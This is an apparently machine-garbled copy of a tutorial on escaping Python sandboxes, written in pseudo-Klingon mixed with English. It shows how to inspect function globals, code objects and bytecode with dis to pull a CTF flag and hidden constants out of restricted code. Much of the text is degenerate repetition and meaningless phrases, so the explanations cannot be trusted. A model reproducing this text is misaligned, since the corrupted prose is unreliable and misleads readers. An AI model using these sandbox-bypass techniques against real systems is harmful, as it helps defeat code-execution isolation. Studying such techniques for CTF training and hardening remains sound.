`dir` jatlhlaHbe'chugh, 'ej 'oH jatlhlaHbe'chugh 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay' 'e' vay'
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### qawHaq

`__qawHaq__` and `func_qawHaq`(cha'logh) jImej. vaj 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhutlh 'ej vItlhut
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**Qa'vIn 'ej ponglIj ghom 'ej**](./#globals-and-locals)

### **QapHa' tlhIngan Hol**

**`__code__`** 'ej `func_code`: **QapHa'** vItlhutlh **'ej** **ghom code object** vItlhutlh **function**.
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### ghItlhvam Daq Code Information

To bypass Python sandboxes, it is crucial to gather information about the code being executed. This information can help in identifying vulnerabilities and finding ways to exploit them. Here are some techniques to obtain code information:

#### 1. Reading the Source Code
One of the simplest ways to gather code information is by reading the source code directly. This can be done by accessing the code files or by using built-in functions like `open()` to read the contents of a file.

#### 2. Decompiling Bytecode
Python bytecode can be decompiled to obtain a higher-level representation of the code. Tools like `uncompyle6` can be used to decompile `.pyc` files and extract the original source code.

#### 3. Inspecting Objects and Modules
Python provides various functions and modules that allow inspection of objects and modules at runtime. Functions like `dir()` and `vars()` can be used to explore the attributes and methods of an object. The `inspect` module provides additional functionalities for code introspection.

#### 4. Debugging and Tracing
Using debugging and tracing techniques can provide valuable insights into the code execution flow. Tools like `pdb` (Python Debugger) can be used to step through the code, set breakpoints, and examine variables at runtime.

#### 5. Dynamic Analysis
Dynamic analysis involves running the code and observing its behavior in real-time. This can be done by using tools like `strace` or `ltrace` to trace system calls and library calls made by the code.

By gathering code information through these techniques, you can gain a deeper understanding of the code's functionality and identify potential weaknesses that can be exploited to bypass Python sandboxes.
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **QapHa' ghom**
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
**ghobe'** **'ej vaj 'oH python sandbox** **'ej 'oH `dis` import.** **bytecode** **function (`get_flag.func_code.co_code`)** **'ej** **disassemble** **'e' vItlhutlh.** **variables being loaded (`LOAD_CONST`)** **content won't see** **'ach** **guess** **'e'** **(get_flag.func_code.co_consts)** **because `LOAD_CONST`** **offset** **variable being loaded.**
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## qo'lu' Python

Hoch, jatlhqa'laHbe'chugh **ghaHtaHvIS 'e' vItlhutlh** 'ej **vItlhutlh** 'e' vItlhutlh.\
vaj 'e' vItlhutlh **code object** 'e' vItlhutlh, 'ach **disassemble vItlhutlh** 'e' vItlhutlh **flag qatlh** (_'ej 'e' vItlhutlh 'e' vItlhutlh `calc_flag` vItlhutlh_) 'e' vItlhutlh.
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### tlhIngan Hol

**Qapla'!** QaStaHvIS **code object** **yIlo'laH** je **'ej chel**. **'Iv** **code object** **yIlo'laH** **'ej** **leaked** **ghItlh** **function** **yIlo'laH** **code object** **yIlo'laH** **'e'** **ghItlh** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** 